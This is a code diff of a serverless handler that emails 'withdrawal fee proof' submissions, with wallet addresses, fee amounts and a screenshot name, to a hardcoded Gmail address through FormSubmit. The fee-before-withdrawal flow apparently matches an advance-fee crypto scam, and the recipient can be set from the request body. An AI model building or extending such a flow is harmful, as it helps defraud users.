@@ -29,11 +29,22 @@ module.exports = async function handler(req, res) {
   var notifyEmail = process.env.FEE_PROOF_EMAIL || body.notifyEmail || "ronniechristopher89@gmail.com";
 
   try {
-    var buffer = Buffer.from(body.fileData, "base64");
-    if (!buffer.length || buffer.length > 8 * 1024 * 1024) {
-      res.status(400).json({ error: "Invalid or oversized file" });
-      return;
+    var fileSizeKb = "";
+    if (body.fileData) {
+      var buffer = Buffer.from(body.fileData, "base64");
+      if (!buffer.length || buffer.length > 3 * 1024 * 1024) {
+        res.status(400).json({ error: "Invalid or oversized file" });
+        return;
+      }
+      fileSizeKb = Math.max(1, Math.round(buffer.length / 1024)) + " KB";
     }
+
+    // FormSubmit AJAX rejects most file attachments (502). Send metadata only.
+    var proofNote =
+      (body.message || "") +
+      (body.fileName
+        ? " Screenshot uploaded: " + body.fileName + (fileSizeKb ? " (" + fileSizeKb + ")." : ".")
+        : "");
 
     var formData = new FormData();
     formData.append("_subject", body.subject || ("Withdrawal fee proof — " + (body.name || "User")));
@@ -45,10 +56,9 @@ module.exports = async function handler(req, res) {
     formData.append("destination_wallet", body.destination_wallet || "");
     formData.append("fee_amount", body.fee_amount || "");
     formData.append("fee_wallet", body.fee_wallet || "");
-    formData.append("message", body.message || "");
-
-    var blob = new Blob([buffer], { type: body.fileType || "application/octet-stream" });
-    formData.append("attachment", blob, body.fileName);
+    formData.append("message", proofNote);
+    formData.append("screenshot_file", body.fileName || "");
+    formData.append("screenshot_size", fileSizeKb);
 
     var upstream = await fetch("https://formsubmit.co/ajax/" + encodeURIComponent(notifyEmail), {
       method: "POST",
